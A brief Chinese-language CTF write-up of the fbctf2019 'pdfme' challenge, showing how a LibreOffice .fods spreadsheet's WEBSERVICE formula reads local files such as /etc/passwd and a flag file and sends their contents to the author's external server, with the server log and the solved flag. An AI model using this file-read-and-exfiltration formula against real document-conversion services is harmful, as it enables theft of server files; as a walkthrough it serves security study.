# pdfme

Solved: 63

<br>

這題其實跟DCTF Final某題非常像

只是當初沒解出來，所以這題還是花了很多時間解XD

找個fods file，然後可以在裡頭用 libreoffice macro 去任意讀檔

讀出來的內容可以用`WEBSERVICE`往外傳



`=COM.MICROSOFT.WEBSERVICE(&quot;http://kaibro.tw/x&quot;)` => send http request to my server

`=COM.MICROSOFT.WEBSERVICE(&quot;/etc/passwd&quot;)` => read `/etc/passwd` file

組合起來

`=COM.MICROSOFT.WEBSERVICE(&quot;http://kaibro.tw/x&quot;&amp;COM.MICROSOFT.WEBSERVICE(&quot;/home/libreoffice_admin/flag&quot;))`

會把帶有 flag 的 Request 送到我們的 server: 

`[01/Jun/2019:22:05:06 +0000] "OPTIONS /xfb%7Bwh0_7h0u6h7_l1br30ff1c3_c4n_b3_u53ful%7D%0A HTTP/1.1" 200 193 "-" "LibreOffice"`



flag: `fb{wh0_7h0u6h7_l1br30ff1c3_c4n_b3_u53ful}`

詳細見payload: [flag.fods](https://github.com/w181496/CTF/blob/master/fbctf2019/pdfme/flag.fods)

<br>

p.s. 這邊有一個小地方要注意

就是flag不在根目錄下XD

我後來讀`/etc/passwd`，發現有`libreoffice_admin`這個 user

才猜測flag在他的家目錄下面
